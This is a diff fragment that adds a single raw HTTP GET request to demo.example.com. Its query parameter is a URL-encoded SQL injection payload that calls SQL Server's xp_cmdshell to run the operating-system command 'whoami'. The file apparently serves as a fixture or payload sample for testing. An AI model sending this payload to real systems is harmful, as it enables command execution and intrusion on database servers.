@@ -1,0 +1,4 @@
+GET /a?cmd=1%2Bexec%2Bxp_cmdshell%28%27whoami%27%29-- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
